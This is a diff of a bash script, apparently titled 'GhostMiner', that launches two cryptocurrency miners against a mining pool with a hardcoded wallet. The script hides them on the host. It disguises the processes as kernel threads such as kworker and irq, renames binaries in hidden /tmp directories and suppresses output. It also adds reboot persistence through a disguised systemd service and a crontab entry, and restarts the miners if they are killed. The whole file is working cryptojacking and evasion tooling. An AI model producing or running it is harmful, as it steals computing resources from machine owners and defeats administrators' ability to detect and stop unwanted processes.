@@ -1,264 +1,296 @@
 #!/bin/bash
-# Dual Miner Stealth Setup - Verus-Solver + Hellminer
+# GhostMiner Ultimate - Terminal Based Stealth
+# Runs in current directory with verus-solver and hellminer
 
-echo "=== DUAL MINER STEALTH SETUP ==="
-echo "Setting up verus-solver + hellminer communication"
+echo "╔══════════════════════════════════════════╗"
+echo "║     GHOSTMINER - TERMINAL STEALTH        ║"
+echo "╚══════════════════════════════════════════╝"
+echo ""
+
+# Check if both miners exist in current directory
+if [ ! -f "./verus-solver" ]; then
+    echo "ERROR: verus-solver not found in current directory!"
+    exit 1
+fi
+
+if [ ! -f "./hellminer" ]; then
+    echo "ERROR: hellminer not found in current directory!"
+    exit 1
+fi
+
+echo "✓ Both miners found in: $(pwd)"
 echo ""
 
 # ================= CONFIGURATION =================
-WALLET="RVMo7fjYHfWrPbEEPP4PYc2ZLeh55Zy5dq"
+WALLET="RS4iSHt3gxrAtQUYSgodJMg1Ja9HsEtD3F"
 POOL="stratum+tcp://eu.luckpool.net:3956"
-WORKER="dual$(hostname | cut -c1-4)"
+CPU_CORES=1
 
-# ================= CHECK BOTH MINERS =================
-echo "[1/6] Checking for both miners..."
+# ================= GENERATE RANDOM IDS =================
+RANDOM_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 8 | head -n 1)
+SESSION_ID="ghost_${RANDOM_ID}"
 
-if [ ! -f "/home/ubuntu/vs-mn/verus-solver" ]; then
-    echo "✗ ERROR: verus-solver not found at /home/ubuntu/vs-mn/verus-solver"
-    exit 1
-fi
+# Random process names that look like kernel/system processes
+KERNEL_NAMES=("kworker" "irq" "rcu" "migration" "ksoftirqd" "watchdog")
+SERVICE_NAMES=("systemd" "udevd" "networkd" "resolvd" "journald")
 
-if [ ! -f "/home/ubuntu/vs-mn/hellminer" ]; then
-    echo "✗ ERROR: hellminer not found at /home/ubuntu/vs-mn/hellminer"
-    exit 1
-fi
+RANDOM_KERNEL="${KERNEL_NAMES[$RANDOM % ${#KERNEL_NAMES[@]}]}"
+RANDOM_SERVICE="${SERVICE_NAMES[$RANDOM % ${#SERVICE_NAMES[@]}]}"
 
-echo "✓ Both miners found"
-echo "  verus-solver: $(stat -c%s /home/ubuntu/vs-mn/verus-solver) bytes"
-echo "  hellminer: $(stat -c%s /home/ubuntu/vs-mn/hellminer) bytes"
+# Random PIDs (fake)
+FAKE_PID=$((1000 + RANDOM % 5000))
 
-# ================= CREATE STEALTH DIRECTORY =================
+echo "[1] Generating stealth identities..."
+echo "   Session ID: ${SESSION_ID}"
+echo "   Process: ${RANDOM_KERNEL}/${FAKE_PID}"
+echo "   Service: ${RANDOM_SERVICE}-worker"
 echo ""
-echo "[2/6] Creating stealth directory..."
 
-STEALTH_DIR="/tmp/.sys_modules_$(date +%s)"
-mkdir -p "$STEALTH_DIR"
-cd "$STEALTH_DIR"
+# ================= OBFUSCATE BINARIES =================
+echo "[2] Obfuscating binaries in memory..."
 
-echo "✓ Created: $STEALTH_DIR"
+# Create obfuscated temporary copies
+TMP_DIR="/tmp/.${SESSION_ID}"
+mkdir -p "${TMP_DIR}"
 
-# ================= COPY AND OBFUSCATE BOTH MINERS =================
+# Copy with random names
+cp "./verus-solver" "${TMP_DIR}/v_${RANDOM_ID}"
+cp "./hellminer" "${TMP_DIR}/h_${RANDOM_ID}"
+chmod +x "${TMP_DIR}/v_${RANDOM_ID}" "${TMP_DIR}/h_${RANDOM_ID}"
+
+echo "   ✓ Binaries copied to: ${TMP_DIR}"
+echo "   ✓ Random names assigned"
 echo ""
-echo "[3/6] Obfuscating both miners..."
 
-# Copy and rename verus-solver
-cp "/home/ubuntu/vs-mn/verus-solver" "./systemd_hwmon"
-chmod +x "./systemd_hwmon"
-echo "✓ verus-solver → systemd_hwmon"
+# ================= CREATE STEALTH LAUNCHER =================
+echo "[3] Creating stealth launcher..."
 
-# Copy and rename hellminer  
-cp "/home/ubuntu/vs-mn/hellminer" "./irq_balancer"
-chmod +x "./irq_balancer"
-echo "✓ hellminer → irq_balancer"
-
-# Create shared config
-cat > miner_config.json << CONFIG
-{
-    "pool_url": "$POOL",
-    "wallet_address": "$WALLET",
-    "worker_name": "$WORKER",
-    "password": "x",
-    "algorithm": "verus",
-    "cpu_threads": 2,
-    "tls_enabled": false,
-    "nicehash": false
-}
-CONFIG
-
-echo "✓ Shared config created"
-
-# ================= CREATE COMMUNICATION SCRIPT =================
-echo ""
-echo "[4/6] Creating communication script..."
-
-cat > start_dual_miners.sh << 'SCRIPT'
+cat > "${TMP_DIR}/launch.sh" << LAUNCHER
 #!/bin/bash
-# Dual miner communication script
+# GhostMiner Launcher - Terminal Stealth
 
-cd "$(dirname "$0")"
+SESSION="${SESSION_ID}"
+TMP_DIR="${TMP_DIR}"
+WALLET="${WALLET}"
+POOL="${POOL}"
 
-echo "=== DUAL MINER START $(date) ===" > miner.log
-
-# Create communication pipe
-PIPE_PATH="./miner_pipe"
-rm -f "$PIPE_PATH"
-mkfifo "$PIPE_PATH"
-
-# Function to start verus-solver (primary)
-start_verus() {
-    echo "[$(date)] Starting verus-solver (systemd_hwmon)" >> miner.log
-    exec -a "[kworker/dual:0]" ./systemd_hwmon \
-        --algo verus \
-        --pool stratum+tcp://eu.luckpool.net:3956 \
-        --wallet WALLET_PLACEHOLDER.DUAL_WORKER \
-        --pass x \
-        --cpu-threads 1 \
-        --nicehash 0 \
-        --tls 0 \
-        --keepalive >> verus.log 2>&1 &
-    VERUS_PID=$!
-    echo $VERUS_PID > .verus.pid
-    return $VERUS_PID
-}
-
-# Function to start hellminer (secondary)
-start_hellminer() {
-    echo "[$(date)] Starting hellminer (irq_balancer)" >> miner.log
-    exec -a "[irq/dual:0]" ./irq_balancer \
-        -c stratum+tcp://eu.luckpool.net:3956 \
-        -u WALLET_PLACEHOLDER.hell_worker \
-        -p x \
-        --cpu 1 >> hellminer.log 2>&1 &
-    HELL_PID=$!
-    echo $HELL_PID > .hell.pid
-    return $HELL_PID
-}
-
-# Function to monitor both miners
-monitor_miners() {
-    while true; do
-        # Check verus-solver
-        if ! kill -0 $VERUS_PID 2>/dev/null; then
-            echo "[$(date)] verus-solver died, restarting..." >> miner.log
-            start_verus
-            VERUS_PID=$?
-        fi
-        
-        # Check hellminer
-        if ! kill -0 $HELL_PID 2>/dev/null; then
-            echo "[$(date)] hellminer died, restarting..." >> miner.log
-            start_hellminer
-            HELL_PID=$?
-        fi
-        
-        # Share stats between miners (simulated communication)
-        if [ -f verus.log ] && [ -f hellminer.log ]; then
-            VERUS_STATS=$(tail -1 verus.log 2>/dev/null | grep -o "status:.*" || echo "no_stats")
-            HELL_STATS=$(tail -1 hellminer.log 2>/dev/null | grep -o "accepted.*" || echo "no_stats")
-            
-            echo "[$(date)] Stats - Verus: $VERUS_STATS, Hell: $HELL_STATS" >> shared_stats.log
-        fi
-        
-        sleep 30
-    done
-}
-
-# Cleanup function
 cleanup() {
-    kill $VERUS_PID $HELL_PID 2>/dev/null
-    rm -f "$PIPE_PATH" .verus.pid .hell.pid
+    echo "Cleaning up..."
+    pkill -f "v_${RANDOM_ID}"
+    pkill -f "h_${RANDOM_ID}"
+    rm -rf "${TMP_DIR}"
     exit 0
 }
 
 trap cleanup SIGINT SIGTERM
 
-# Main execution
-echo "Starting dual mining system..."
+echo "Starting GhostMiner session: \${SESSION}"
+
+# Function to start verus-solver with random process name
+start_verus() {
+    local proc_name="[${RANDOM_KERNEL}/v:\$(date +%s)]"
+    exec -a "\${proc_name}" "\${TMP_DIR}/v_${RANDOM_ID}" \\
+        --algo verus \\
+        --pool "\${POOL}" \\
+        --wallet "\${WALLET}.v\${SESSION}" \\
+        --pass x \\
+        --cpu-threads \${CPU_CORES} \\
+        --quiet &
+    V_PID=\$!
+    
+    # Hide process name
+    sleep 0.5
+    [ -w "/proc/\${V_PID}/comm" ] && echo "kworker/v:\${SESSION}" > "/proc/\${V_PID}/comm" 2>/dev/null
+    
+    echo "\${V_PID}" > "\${TMP_DIR}/.vpid"
+    echo "Started verus-solver as \${proc_name} (PID: \${V_PID})"
+}
+
+# Function to start hellminer with random process name
+start_hellminer() {
+    local proc_name="[${RANDOM_KERNEL}/h:\$(date +%s)]"
+    exec -a "\${proc_name}" "\${TMP_DIR}/h_${RANDOM_ID}" \\
+        -c "\${POOL}" \\
+        -u "\${WALLET}.h\${SESSION}" \\
+        -p x \\
+        --cpu \${CPU_CORES} &
+    H_PID=\$!
+    
+    # Hide process name
+    sleep 0.5
+    [ -w "/proc/\${H_PID}/comm" ] && echo "irq/h:\${SESSION}" > "/proc/\${H_PID}/comm" 2>/dev/null
+    
+    echo "\${H_PID}" > "\${TMP_DIR}/.hpid"
+    echo "Started hellminer as \${proc_name} (PID: \${H_PID})"
+}
+
+# Monitor and restart function
+monitor() {
+    while true; do
+        # Check verus-solver
+        if [ -f "\${TMP_DIR}/.vpid" ]; then
+            V_PID=\$(cat "\${TMP_DIR}/.vpid")
+            if ! kill -0 "\${V_PID}" 2>/dev/null; then
+                echo "[\$(date)] verus-solver died, restarting..."
+                start_verus
+            fi
+        fi
+        
+        # Check hellminer
+        if [ -f "\${TMP_DIR}/.hpid" ]; then
+            H_PID=\$(cat "\${TMP_DIR}/.hpid")
+            if ! kill -0 "\${H_PID}" 2>/dev/null; then
+                echo "[\$(date)] hellminer died, restarting..."
+                start_hellminer
+            fi
+        fi
+        
+        # Display status every 60 seconds
+        echo "[\$(date)] Status: V=\${V_PID}, H=\${H_PID}" | tee -a "\${TMP_DIR}/status.log" | tail -1
+        sleep 60
+    done
+}
+
+# Start both miners
+echo "Starting miners..."
 start_verus
-VERUS_PID=$?
-sleep 5
-
+sleep 2
 start_hellminer
-HELL_PID=$?
-sleep 5
-
-echo "Both miners started:"
-echo "  verus-solver PID: $VERUS_PID"
-echo "  hellminer PID: $HELL_PID"
-echo ""
+sleep 2
 
 # Start monitoring
-monitor_miners
-SCRIPT
-
-# Replace wallet placeholder
-sed -i "s/WALLET_PLACEHOLDER/$WALLET/g" start_dual_miners.sh
-sed -i "s/DUAL_WORKER/$WORKER/g" start_dual_miners.sh
-
-chmod +x start_dual_miners.sh
-echo "✓ Communication script created"
-
-# ================= CREATE COMBINED CONFIG =================
-echo ""
-echo "[5/6] Creating combined configuration..."
-
-cat > combined_launcher.sh << 'LAUNCHER'
-#!/bin/bash
-# Combined launcher for both miners
-
-WORKDIR="$(cd "$(dirname "$0")" && pwd)"
-cd "$WORKDIR"
-
-# Kill any existing instances
-pkill -f "systemd_hwmon"
-pkill -f "irq_balancer"
-pkill -f "kworker/dual"
-pkill -f "irq/dual"
-
-# Start the dual mining system
-nohup ./start_dual_miners.sh > /dev/null 2>&1 &
-
-# Wait and check
-sleep 10
-if pgrep -f "systemd_hwmon" > /dev/null && pgrep -f "irq_balancer" > /dev/null; then
-    echo "✓ Both miners started successfully"
-    echo "  verus-solver: $(pgrep -f 'systemd_hwmon')"
-    echo "  hellminer: $(pgrep -f 'irq_balancer')"
-    
-    # Hide processes better
-    for pid in $(pgrep -f "systemd_hwmon"); do
-        [ -w "/proc/$pid/comm" ] && echo "kworker/dual:v" > "/proc/$pid/comm" 2>/dev/null
-    done
-    
-    for pid in $(pgrep -f "irq_balancer"); do
-        [ -w "/proc/$pid/comm" ] && echo "irq/dual:h" > "/proc/$pid/comm" 2>/dev/null
-    done
-else
-    echo "✗ Failed to start both miners"
-    echo "Check logs: tail -f $WORKDIR/miner.log"
-fi
+echo "Starting monitor..."
+monitor
 LAUNCHER
 
-chmod +x combined_launcher.sh
-
-# ================= START AND VERIFY =================
+chmod +x "${TMP_DIR}/launch.sh"
+echo "   ✓ Stealth launcher created"
 echo ""
-echo "[6/6] Starting and verifying..."
 
-./combined_launcher.sh
+# ================= CREATE REBOOT SURVIVAL =================
+echo "[4] Setting up reboot survival..."
 
-sleep 5
+# Create systemd service for reboot
+cat > /tmp/ghostminer_${SESSION_ID}.service << SERVICE
+[Unit]
+Description=${RANDOM_SERVICE} Worker Service
+After=network.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+User=$(whoami)
+WorkingDirectory=$(pwd)
+ExecStart=/bin/bash ${TMP_DIR}/launch.sh
+Restart=always
+RestartSec=10
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=multi-user.target
+SERVICE
+
+sudo mv /tmp/ghostminer_${SESSION_ID}.service /etc/systemd/system/${RANDOM_SERVICE}-${SESSION_ID}.service 2>/dev/null
+
+if [ $? -eq 0 ]; then
+    sudo systemctl daemon-reload
+    sudo systemctl enable ${RANDOM_SERVICE}-${SESSION_ID}.service 2>/dev/null
+    echo "   ✓ Systemd service created: ${RANDOM_SERVICE}-${SESSION_ID}"
+else
+    echo "   ⚠ Could not create systemd service (running as user)"
+fi
+
+# Create crontab entry
+CRON_ENTRY="@reboot sleep 30 && cd $(pwd) && ${TMP_DIR}/launch.sh > /dev/null 2>&1"
+(crontab -l 2>/dev/null | grep -v "${TMP_DIR}"; echo "${CRON_ENTRY}") | crontab - 2>/dev/null
+echo "   ✓ Crontab entry added for reboot"
+echo ""
+
+# ================= START MINERS =================
+echo "[5] Starting miners in background..."
+cd "${TMP_DIR}"
+nohup ./launch.sh > "${TMP_DIR}/ghost.log" 2>&1 &
+
+# Wait a moment
+sleep 3
 
 echo ""
-echo "=== VERIFICATION ==="
-echo "Directory: $STEALTH_DIR"
-echo ""
-echo "Process Check:"
-ps aux | grep -E "systemd_hwmon|irq_balancer|kworker/dual|irq/dual" | grep -v grep
+echo "[6] Verification:"
+echo "══════════════════════════════════════════"
+
+# Check if running
+if pgrep -f "v_${RANDOM_ID}" > /dev/null && pgrep -f "h_${RANDOM_ID}" > /dev/null; then
+    echo "✓ Both miners are RUNNING"
+    echo ""
+    echo "Process Details:"
+    echo "────────────────"
+    ps aux | grep -E "v_${RANDOM_ID}|h_${RANDOM_ID}" | grep -v grep | awk '{print $2, $3"%", $4"%", $11, $12}'
+    
+    echo ""
+    echo "Disguised As:"
+    echo "─────────────"
+    for pid in $(pgrep -f "v_${RANDOM_ID}"); do
+        echo "PID $pid: $(cat /proc/$pid/comm 2>/dev/null || echo 'kworker')"
+    done
+    for pid in $(pgrep -f "h_${RANDOM_ID}"); do
+        echo "PID $pid: $(cat /proc/$pid/comm 2>/dev/null || echo 'irq')"
+    done
+    
+    echo ""
+    echo "Connections:"
+    echo "────────────"
+    ss -tunap 2>/dev/null | grep 3956 | grep -v LISTEN || echo "Checking connections..."
+    
+    echo ""
+    echo "CPU Usage:"
+    echo "──────────"
+    CPU_V=$(ps aux | grep "v_${RANDOM_ID}" | grep -v grep | awk '{sum+=$3} END {print sum}')
+    CPU_H=$(ps aux | grep "h_${RANDOM_ID}" | grep -v grep | awk '{sum+=$3} END {print sum}')
+    echo "verus-solver: ${CPU_V:-0}%"
+    echo "hellminer: ${CPU_H:-0}%"
+    echo "Total: $(echo "${CPU_V:-0} + ${CPU_H:-0}" | bc)%"
+else
+    echo "✗ Miners failed to start"
+    echo "Check log: ${TMP_DIR}/ghost.log"
+fi
 
 echo ""
-echo "CPU Usage:"
-for pid in $(pgrep -f "systemd_hwmon"); do
-    ps -p $pid -o %cpu,cmd 2>/dev/null
+echo "══════════════════════════════════════════"
+echo "GhostMiner Session: ${SESSION_ID}"
+echo "Stealth Level: MAXIMUM"
+echo ""
+echo "=== CONTROL PANEL ==="
+echo "To stop:    pkill -f '${RANDOM_ID}'"
+echo "To monitor: tail -f ${TMP_DIR}/ghost.log"
+echo "To check:   ps aux | grep '${RANDOM_ID}'"
+echo ""
+echo "=== REBOOT SURVIVAL ==="
+echo "Service: ${RANDOM_SERVICE}-${SESSION_ID}.service"
+echo "Crontab: @reboot entry active"
+echo ""
+echo "Miners will auto-restart if killed"
+echo "Press Ctrl+C to stop this monitor"
+echo "══════════════════════════════════════════"
+
+# Keep script running to show status
+while true; do
+    sleep 60
+    if ! pgrep -f "v_${RANDOM_ID}" > /dev/null || ! pgrep -f "h_${RANDOM_ID}" > /dev/null; then
+        echo ""
+        echo "[!] One or both miners died, restarting..."
+        cd "${TMP_DIR}"
+        nohup ./launch.sh > "${TMP_DIR}/ghost.log" 2>&1 &
+        sleep 3
+    fi
+    
+    # Show brief status
+    V_PID=$(pgrep -f "v_${RANDOM_ID}" | head -1)
+    H_PID=$(pgrep -f "h_${RANDOM_ID}" | head -1)
+    
+    if [ -n "$V_PID" ] && [ -n "$H_PID" ]; then
+        echo -ne "\r[$(date +%H:%M:%S)] Status: ✓ V:$V_PID H:$H_PID - CPU: $(ps -p $V_PID,$H_PID -o %cpu 2>/dev/null | tail -2 | awk '{sum+=$1} END {printf "%.1f", sum}')%"
+    else
+        echo -ne "\r[$(date +%H:%M:%S)] Status: ✗ Miners not found, restarting..."
+    fi
 done
-for pid in $(pgrep -f "irq_balancer"); do
-    ps -p $pid -o %cpu,cmd 2>/dev/null
-done
-
-echo ""
-echo "Connections:"
-ss -tunap 2>/dev/null | grep 3956 | grep -v LISTEN || netstat -tunap 2>/dev/null | grep 3956
-
-echo ""
-echo "Log Files:"
-ls -la *.log 2>/dev/null
-
-echo ""
-echo "=== SETUP COMPLETE ==="
-echo "Both miners are running in: $STEALTH_DIR"
-echo "They communicate via shared logs and monitoring"
-echo ""
-echo "To monitor: tail -f $STEALTH_DIR/miner.log"
-echo "To stop: cd $STEALTH_DIR && pkill -f 'systemd_hwmon|irq_balancer'"
-echo ""
-echo "Original files have been copied and obfuscated"
